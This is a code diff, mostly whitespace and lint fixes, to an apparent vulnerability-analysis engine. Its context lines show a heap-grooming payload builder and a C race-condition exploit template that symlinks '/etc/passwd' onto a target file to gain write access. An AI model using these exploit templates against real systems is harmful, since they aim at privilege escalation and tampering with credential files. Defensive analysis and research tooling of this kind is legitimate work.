@@ -1,5 +1,6 @@
 """Symbolic execution engine for dynamic path analysis and constraint solving."""
 import logging
+import os
 import struct
 import time
 import traceback
@@ -56,22 +57,22 @@ class SymbolicExecutionEngine:
         self.timeout = timeout
         self.memory_limit = memory_limit * 1024 * 1024  # Convert MB to bytes
         self.logger = logging.getLogger("IntellicrackLogger.SymbolicExecution")
-        
+
         # Execution state
         self.states = []
         self.completed_paths = []
         self.crashed_states = []
         self.timed_out_states = []
-        
+
         # Analysis results
         self.coverage_data = {}
         self.discovered_vulnerabilities = []
         self.path_constraints = []
-        
+
         # Check binary file
         if not os.path.exists(binary_path):
             raise FileNotFoundError(f"Binary file not found: {binary_path}")
-        
+
         self.logger.info(f"Symbolic execution engine initialized for {binary_path} with {max_paths} max paths")
 
     def discover_vulnerabilities(self, vulnerability_types: Optional[List[str]] = None) -> List[Dict[str, Any]]:
@@ -441,7 +442,7 @@ class SymbolicExecutionEngine:
         payload = bytearray()
 
         # Heap grooming: allocate predictable chunks
-        for i in range(16):
+        for _i in range(16):
             # Allocation pattern to create predictable heap layout
             payload += struct.pack("<I", 0x21)  # Chunk size (32 bytes + flags)
             payload += b"A" * 24  # Chunk data
@@ -588,12 +589,12 @@ class SymbolicExecutionEngine:
 void *race_thread1(void *arg) {
     volatile int *flag = (int *)arg;
     int fd;
-    
+
     while (*flag == 0) {
         // Tight loop waiting for sync
         __asm__ __volatile__("pause");
     }
-    
+
     // Race window operation 1
     fd = open("/target/file", O_RDWR);
     if (fd >= 0) {
@@ -601,7 +602,7 @@ void *race_thread1(void *arg) {
         write(fd, "AAAA", 4);
         close(fd);
     }
-    
+
     return NULL;
 }
 """
@@ -610,16 +611,16 @@ void *race_thread1(void *arg) {
         thread2_code = """
 void *race_thread2(void *arg) {
     volatile int *flag = (int *)arg;
-    
+
     while (*flag == 0) {
         __asm__ __volatile__("pause");
     }
-    
+
     // Race window operation 2
     // Attempt to change permissions/state
     chmod("/target/file", 0666);
     symlink("/etc/passwd", "/target/file");
-    
+
     return NULL;
 }
 """
@@ -630,27 +631,27 @@ int main() {{
     pthread_t t1, t2;
     volatile int sync_flag = 0;
     int success = 0;
-    
+
     for (int i = 0; i < {race_exploit['iterations']}; i++) {{
         sync_flag = 0;
-        
+
         pthread_create(&t1, NULL, race_thread1, (void *)&sync_flag);
         pthread_create(&t2, NULL, race_thread2, (void *)&sync_flag);
-        
+
         // Synchronize thread start
         usleep(10);
         sync_flag = 1;
-        
+
         pthread_join(t1, NULL);
         pthread_join(t2, NULL);
-        
+
         // Check if race was won
         if (access("/target/file", W_OK) == 0) {{
             success = 1;
             break;
         }}
     }}
-    
+
     return success ? 0 : 1;
 }}
 """
